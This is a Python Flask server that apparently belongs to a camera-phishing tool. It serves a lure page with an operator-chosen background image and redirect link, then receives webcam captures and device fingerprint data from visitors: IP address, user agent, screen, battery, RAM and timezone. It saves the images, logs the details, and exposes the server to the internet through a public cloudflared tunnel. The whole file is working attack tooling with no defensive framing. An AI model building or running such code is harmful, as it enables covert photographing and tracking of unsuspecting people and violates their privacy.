from flask import Flask, request, render_template, jsonify
import base64
import os
import subprocess
import re
from datetime import datetime

app = Flask(__name__)

# User inputs
background_image = input("Background image URL: ")
redirect_url = input("Redirect link: ")

# Directories
SAVE_DIR = "captured_images"
LOG_FILE = "user_logs.txt"
os.makedirs(SAVE_DIR, exist_ok=True)

@app.route('/')
def home():
    return render_template("index.html", bgImg=background_image, redUrl=redirect_url)

@app.route('/capture', methods=['POST'])
def capture(): 
    try:
        data = request.json
        image_data = data.get("img")
        user_data = data.get("userData", {})
        session_id = user_data.get("sessionId", "Unknown")

        if not image_data:
            return jsonify({"error": "No image received"}), 400

        image_bytes = base64.b64decode(image_data.split(",")[1])
        file_path = os.path.join(SAVE_DIR, f"capture_{session_id}.jpg")
        with open(file_path, "wb") as f:
            f.write(image_bytes)

        selected_images = user_data.get("selectedImages", [])
        log_entry = (
            f"[Capture]\n"
            f"Session  : {session_id}\n"
            f"Time     : {user_data.get('timestamp', 'Unknown')}\n"
            f"IP       : {user_data.get('ipAddress', 'Not available')} (Public: {request.remote_addr})\n"
            f"UA       : {user_data.get('userAgent', 'Unknown')}\n"
            f"Screen   : {user_data.get('screen', 'Unknown')}\n"
            f"Language : {user_data.get('language', 'Unknown')}\n"
            f"Timezone : {user_data.get('timezone', 'Unknown')}\n"
            f"Battery  : {user_data.get('battery', 'Not available')}\n"
            f"RAM      : {user_data.get('ram', 'Not supported')}\n"
            f"ROM      : {user_data.get('rom', 'Not supported')}\n"
            f"Images   : {', '.join(selected_images) if selected_images else 'None'}\n"
            f"Capture  : {file_path}\n"
            "----------------------------------------\n"
        )
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)

        return jsonify({"message": "Image captured"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print("Starting Flask server...\n")
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", "http://localhost:5000"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # Fixed comma instead of dot
        text=True
    )

    tunnel_url = None
    icmp_ipv4 = None
    icmp_ipv6 = None

    for line in process.stdout:
        if not tunnel_url:
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if match:
                tunnel_url = match.group(0)
        if not icmp_ipv4:
            match = re.search(r"ICMP proxy will use (\d+\.\d+\.\d+\.\d+) as source for IPv4", line)
            if match:
                icmp_ipv4 = match.group(1)
        if not icmp_ipv6:
            match = re.search(r"ICMP proxy will use ([a-fA-F0-9:]+) in zone eth0 as source for IPv6", line)
            if match:
                icmp_ipv6 = match.group(1)
        if tunnel_url and icmp_ipv4 and icmp_ipv6:
            break

    if tunnel_url:
        print("\033[92mTunnel URL:\033[0m")
        print(f"\033[96m{tunnel_url}\033[0m\n")
    if icmp_ipv4 or icmp_ipv6:
        print("\033[93mICMP Proxy Info:\033[0m")
        if icmp_ipv4:
            print(f"  IPv4: {icmp_ipv4}")
        if icmp_ipv6:
            print(f"  IPv6: {icmp_ipv6}")

    app.run(host='0.0.0.0', port=5000)
